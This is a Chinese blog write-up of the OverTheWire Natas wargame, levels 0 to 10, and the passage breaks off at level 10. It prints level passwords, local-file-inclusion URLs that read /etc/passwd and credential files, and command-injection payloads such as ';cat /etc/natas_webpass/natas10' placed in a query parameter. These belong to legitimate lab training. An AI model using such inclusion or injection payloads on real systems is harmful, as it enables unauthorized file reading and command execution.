<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="涂寐"><title>Natas 0 to 15 for Wargames | 涂寐&#39;s Blogs</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/fontawesome/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"example.com",root:"/",language:"zh-CN",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!1,init_open:!0},style:{primary_color:"#0066cc",logo:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",favicon:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",avatar:"https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico",font_size:"18px",font_family:"STKaiti, STSong, STHeiti",hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"现在的你不努力||未来的你·该有多狼狈",font_color:null,hitokoto:!1},scroll:{progress_bar:!0,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"default"},side_tools:{},pjax:{enable:!0},lazyload:{enable:!0},comment:{enable:!0,use:"valine",valine:{appid:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appkey:"C0Wy6Sfq0qVag0nm59fc1D12",placeholder:"道友，请留步！请留言~"},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null},twikoo:{env_id:null,region:null,version:"1.6.7"},waline:{server_url:null,reaction:!1,version:2}},post:{author_label:{enable:!0,auto:!0,custom_label_list:["涂寐"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"center",copyright_info:!0},version:"3.5.2"},KEEP.language_ago={second:"%s 秒前",minute:"%s 分钟前",hour:"%s 小时前",day:"%s 天前",week:"%s 周前",month:"%s 个月前",year:"%s 年前"},KEEP.language_code_block={copy:"复制代码",copied:"已复制",fold:"折叠代码块",folded:"已折叠"}</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="scroll-progress-bar"></span> <span class="pjax-progress-bar"></span> <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"> </a><a class="logo-title" href="/">涂寐&#39;s Blogs</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">首页</a></li><li class="menu-item"><a href="/archives">归档</a></li><li class="menu-item"><a href="/tags">标签</a></li><li class="menu-item"><a href="/categories">分类</a></li><li class="menu-item"><a href="/links">友链</a></li><li class="menu-item"><a href="/about">关于</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">首页</a></li><li class="drawer-menu-item flex-center"><a href="/archives">归档</a></li><li class="drawer-menu-item flex-center"><a href="/tags">标签</a></li><li class="drawer-menu-item flex-center"><a href="/categories">分类</a></li><li class="drawer-menu-item flex-center"><a href="/links">友链</a></li><li class="drawer-menu-item flex-center"><a href="/about">关于</a></li></ul></div><div class="window-mask"></div><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"JiZItHVhLKBShkL0",ck:"JiZItHVhLKBShkL0"})</script></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">Natas 0 to 15 for Wargames</span></div><div class="article-header"><div class="avatar"><img src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/favicon.ico"></div><div class="info"><div class="author"><span class="name">涂寐</span> <span class="author-label">Lv4</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2023-09-14 23:43:57</span> <span class="mobile">2023-09-14 23:43</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-10-08 22:46:07</span> </span><span class="article-categories article-meta-item"><i class="fas fa-folder"></i>&nbsp;<ul><li><a href="/categories/targettange/">靶场</a>&nbsp;</li></ul></span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/essay/">随笔</a>&nbsp;</li><li>| <a href="/tags/success/">通关</a>&nbsp;</li></ul></span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><blockquote><p>生活没有提示，而靶机会给你解答。——涂寐</p></blockquote><h2 id="Level-0——网页源代码"><a href="#Level-0——网页源代码" class="headerlink" title="Level 0——网页源代码"></a>Level 0——网页源代码</h2><ul><li>Natas教授服务器端Web安全的基础知识。</li><li>每个级别的natas都由位于 <a class="link" target="_blank" rel="noopener" href="http://natasx.natas.labs.overthewire.org/">http://natasX.natas.labs.overthewire.org<i class="fas fa-external-link-alt"></i></a> 的自己的网站组成，其中X是级别号。没有 SSH 登录。要访问某个级别，请输入该级别的用户名（例如，natas0 表示级别 0）及其密码。</li><li>每个级别都可以访问下一级的密码。您的工作是以某种方式获取下一个密码并升级。所有密码也存储在 <code>/etc/natas_webpass/</code> 中。例如，natas5 的密码存储在文件 <code>/etc/natas_webpass/natas5</code> 中，只有 natas4 和 natas5 才能读取。</li><li>这里开始：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Username: natas0</span><br><span class="line">Password: natas0</span><br><span class="line">URL:      http://natas0.natas.labs.overthewire.org</span><br></pre></td></tr></table></figure><ul><li>您可以在此页面上找到下一级别的密码。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/64e211d41fa28aad3aeb41c416e2e4bf5c1.png" alt="image-20230817234429901"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 是的，它没让你解密</span></span><br><span class="line">view-source:http://natas0.natas.labs.overthewire.org/</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">natas1</span><br><span class="line">g9D9cREhslqBKtcA2uocGHPfMZVzeFK6</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/2a1bfcc8236f0d4d9a1cc525c660189053b.png" alt="image-20230706163742344"></p><h2 id="Level-1——网页源代码"><a href="#Level-1——网页源代码" class="headerlink" title="Level 1——网页源代码"></a>Level 1——网页源代码</h2><ul><li>您可以在此页面上找到下一级别的密码，但右键单击已被阻止！</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/13005fe4fad0ce1a9a0693974fd3ed61d6a.png" alt="image-20230817234529298"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只要我不在它指定的位置右键，它就不会触发禁止邮件提示</span></span><br><span class="line">view-source:http://natas1.natas.labs.overthewire.org/</span><br><span class="line"><span class="comment"># </span></span><br><span class="line">natas2</span><br><span class="line">h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/0e49e3bbcc625e83443a9f8cd8082fd2d77.png" alt="image-20230706164146860"></p><h2 id="Level-2——目录遍历"><a href="#Level-2——目录遍历" class="headerlink" title="Level 2——目录遍历"></a>Level 2——目录遍历</h2><ul><li>此页面上没有任何内容</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/354314f6b75fc1842db135846288d3b8444.png" alt="image-20230817234659761"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 图片暴露路径，访问其上级目录发现目录遍历</span></span><br><span class="line">view-source:http://natas2.natas.labs.overthewire.org/</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># username:password</span></span><br><span class="line">alice:BYNdCesZqW</span><br><span class="line">bob:jw2ueICLvT</span><br><span class="line">charlie:G5vCxkVV3m</span><br><span class="line">natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q</span><br><span class="line">eve:zo4mJWyNj2</span><br><span class="line">mallory:9urtcpzBmH</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/992e95517f9ab07deed8637cf34bbb15063.png" alt="image-20230706180738676"></p><h2 id="Level-3——文件泄露-robots-txt"><a href="#Level-3——文件泄露-robots-txt" class="headerlink" title="Level 3——文件泄露-robots.txt"></a>Level 3——文件泄露-robots.txt</h2><ul><li>此页面上没有任何内容</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/b09f8acf8e7bbc15f6ec9f0767055af5cfc.png" alt="image-20230817234821335"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不再有信息泄露！！这次连谷歌都找不到</span></span><br><span class="line"><span class="comment"># 扫目录喽，扫不出？？？是我丢人喽……</span></span><br><span class="line"><span class="comment"># 记得常试试 robots.txt，可能有一些不给访问的路径</span></span><br><span class="line"><span class="comment"># 嗯，没登陆访问不到，情有可原情有可原</span></span><br><span class="line">http://natas3.natas.labs.overthewire.org/robots.txt</span><br><span class="line">view-source:http://natas3.natas.labs.overthewire.org/s3cr3t/</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/f81ef6d101309e1409c1843ea64f47c339d.png" alt="image-20230708095452459"></p><h2 id="Level-4——referer-欺骗"><a href="#Level-4——referer-欺骗" class="headerlink" title="Level 4——referer 欺骗"></a>Level 4——referer 欺骗</h2><ul><li>禁止访问。您是从“<a class="link" target="_blank" rel="noopener" href="http://natas4.natas.labs.overthewire.org/index.php%E2%80%9C%E8%80%8C%E6%8E%88%E6%9D%83%E7%94%A8%E6%88%B7%E5%BA%94%E4%BB%85%E6%9D%A5%E8%87%AA%E2%80%9Dhttp://natas5.natas.labs.overthewire.org/%E2%80%9C">http://natas4.natas.labs.overthewire.org/index.php“而授权用户应仅来自”http://natas5.natas.labs.overthewire.org/“<i class="fas fa-external-link-alt"></i></a></li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/e676f8c9ad2aa78806bf527af25e17e0c19.png" alt="image-20230817235405678"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 禁止访问。您是从“http://natas4.natas.labs.overthewire.org/“而授权用户应仅来自”http://natas5.natas.labs.overthewire.org/”</span></span><br><span class="line"><span class="comment"># 来源？referer？这个我会</span></span><br><span class="line"><span class="comment"># 使用插件：ModHeader</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">Access granted. The password <span class="keyword">for</span> natas5 <span class="keyword">is</span> Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/cc4463648e5ad2b3ad1be7cb41accb4f5ad.png" alt="image-20230708101504740"></p><h2 id="Level-5——越权-cookie"><a href="#Level-5——越权-cookie" class="headerlink" title="Level 5——越权-cookie"></a>Level 5——越权-cookie</h2><ul><li>禁止访问。您未登录</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/4f94c1bdeb58d55ffb493126a01a73f6150.png" alt="image-20230817235447332"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 禁止访问。您未登录</span><br><span class="line"># 是的，我又去扫目录了，还去寻找支持登录扫目录的工具……没去看 cookie</span><br><span class="line"># 使用插件：EditThisCookie</span><br><span class="line"># </span><br><span class="line">Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/9b76f60e5bff414dc74168a4657a6ef577b.png" alt="image-20230708104242871"></p><h2 id="Level-6——源码泄露-文件泄露"><a href="#Level-6——源码泄露-文件泄露" class="headerlink" title="Level 6——源码泄露-文件泄露"></a>Level 6——源码泄露-文件泄露</h2><ul><li>输入密钥。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/b04103bc91022d7395db9092bea16950aa2.png" alt="image-20230817235617256"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas6.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"><span class="comment"># why？错误的回显呢！ok？默认就是，让人难以注意</span></span><br><span class="line">……</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;includes/secret.inc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$secret</span> == <span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">……</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 是的，我们发起 post 请求时需要携带 submit 和 secret 字段，赋值为指定内容才能获取密码</span></span><br><span class="line"><span class="comment"># 看下这个泄露的路径（源码中引入的“includes/secret.inc”文件），是否有收获呢？</span></span><br><span class="line"><span class="comment"># http://natas6.natas.labs.overthewire.org/includes/secret.inc</span></span><br><span class="line"><span class="comment"># 是的，includes 也是一个目录</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;FOEIUWGHFEEUHOFUOIU&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/3dac5a6a4d6a9684200ea6a7b2b90f39ca1.png" alt="image-20230818000154646"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输入框写入并提交：FOEIUWGHFEEUHOFUOIU</span></span><br><span class="line">Access granted. The password <span class="keyword">for</span> natas7 <span class="keyword">is</span> jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/55981c42c0e090fb52ad2c0a1a9ff8208a0.png" alt="image-20230708120004288"></p><h2 id="Level-7——本地文件包含"><a href="#Level-7——本地文件包含" class="headerlink" title="Level 7——本地文件包含"></a>Level 7——本地文件包含</h2><ul><li>首页</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/606af4c63afd82337b046aa470db14a7a37.png" alt="image-20230818000414154"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开头有讲：所有密码也存储在 /etc/natas_webpass/ 中</span></span><br><span class="line"><span class="comment"># 提示：网络用户natas8的密码在/etc/natas_webpass/natas8中</span></span><br><span class="line">http://natas7.natas.labs.overthewire.org/index.php?page=home<span class="string">&#x27;</span></span><br><span class="line"><span class="string">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/passwd</span></span><br><span class="line"><span class="string">http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/a908a8a889e72b88cb4d236274948dca4ab.png" alt="image-20230708152623866"></p><h2 id="Level-8——源码泄露-编码问题"><a href="#Level-8——源码泄露-编码问题" class="headerlink" title="Level 8——源码泄露-编码问题"></a>Level 8——源码泄露-编码问题</h2><ul><li>输入密钥。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/688915efd4b72a0c9a4aa22174a54937d10.png" alt="image-20230818000621830"></p><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas8.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encodedSecret</span> = <span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$secret</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">encodeSecret</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>]) == <span class="variable">$encodedSecret</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/f56b02dbed60edd4528609f018d4987c774.png" alt="image-20230818000723180"></p><ul><li>解析与解密</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bin2hex(strrev(base64_encode(admin)))</span></span><br><span class="line">首先，使用 base64_encode 对字符串进行 Base64 编码。编码后的结果是 <span class="string">&quot;YWRtaW4=&quot;</span>。</span><br><span class="line">接下来，使用 strrev 对编码后的字符串进行反转，结果为 <span class="string">&quot;=4tiWnR&quot;</span>.</span><br><span class="line">最后，使用 bin2hex 对反转后的字符串进行十六进制编码，得到最终结果 <span class="string">&quot;3d347469576e52&quot;</span>。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解码脚本</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">hex_string = <span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span></span><br><span class="line"><span class="comment"># 将十六进制转换为字节数据</span></span><br><span class="line">byte_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"><span class="comment"># 将字节数据转换为字符串</span></span><br><span class="line">original_string = byte_data.decode()</span><br><span class="line"><span class="comment"># 反转字符串（首尾字符互换）</span></span><br><span class="line">reversed_string = original_string[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 进行 base64 解码</span></span><br><span class="line">decoded_data = base64.b64decode(reversed_string)</span><br><span class="line"><span class="comment"># 将解码后的字节数据转换为字符串</span></span><br><span class="line">decoded_string = decoded_data.decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded string:&quot;</span>, decoded_string)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/5af45214d9d95176b87b70b9431c2dff24c.png" alt="image-20230708162228503"></p><h2 id="Level-9——命令执行"><a href="#Level-9——命令执行" class="headerlink" title="Level 9——命令执行"></a>Level 9——命令执行</h2><ul><li>查找包含。</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/4e7cc7d2a391356da0b584d7f128ab73a4f.png" alt="image-20230818000902969"></p><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas9.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;&quot;</span>; <span class="comment">// 初始化变量$key为空字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;needle&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;needle&quot;</span>]; <span class="comment">// 如果$_REQUEST中存在&quot;needle&quot;键，将其值赋给变量$key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;grep -i <span class="subst">$key</span> dictionary.txt&quot;</span>); <span class="comment">// 如果$key不为空，则执行&quot;grep -i $key dictionary.txt&quot;命令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/81f14f06dd40337ff59c7cdad67360d3637.png" alt="image-20230818001052685"></p><ul><li>解析说明</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># grep -i $key dictionary.txt 查找 &quot;$key&quot; 是否存在 &quot;dictionary.txt&quot; 中</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 查找并显示文件 &quot;/etc/natas_webpass/natas10&quot; 和 &quot;dictionary.txt&quot; 中存在 &quot;a&quot; 字符串的行</span></span><br><span class="line"><span class="comment"># grep -i a /etc/natas_webpass/natas10 dictionary.txt</span></span><br><span class="line">http://natas9.natas.labs.overthewire.org/?needle=a /etc/natas_webpass/natas10&amp;submit=Search</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 使用管道符(|)拼接命令，显示文件 &quot;/etc/natas_webpass/natas10&quot; 和 &quot;dictionary.txt&quot; 中的内容</span></span><br><span class="line"><span class="comment"># grep -i a|cat /etc/natas_webpass/natas10 dictionary.txt</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 使用分号(;)截断前面的命令，再显示文件 &quot;/etc/natas_webpass/natas10&quot; 和 &quot;dictionary.txt&quot; 中的内容</span></span><br><span class="line"><span class="comment"># grep -i ;cat /etc/natas_webpass/natas10 dictionary.txt</span></span><br><span class="line">http://natas9.natas.labs.overthewire.org/?needle=;cat /etc/natas_webpass/natas10&amp;submit=Search</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 将 &quot;grep -i a&quot; 放置在后台执行，并显示文件 &quot;/etc/natas_webpass/natas10&quot; 和 &quot;dictionary.txt&quot; 中的内容</span></span><br><span class="line"><span class="comment"># grep -i a&amp;cat /etc/natas_webpass/natas10 dictionary.txt</span></span><br><span class="line">http://natas9.natas.labs.overthewire.org/?needle=a&amp;cat /etc/natas_webpass/natas10&amp;submit=Search</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/ac430bc36438bc6f1f13e668994b30e39ec.png" alt="image-20230716000456348"></p><h2 id="Level-10——命令执行绕过"><a href="#Level-10——命令执行绕过" class="headerlink" title="Level 10——命令执行绕过"></a>Level 10——命令执行绕过</h2><ul><li>出于安全考虑，我们现在过滤某些字符。查找包含以下内容的单词：</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/99eff9ccdd8b8cd9c191401c734cb8d1564.png" 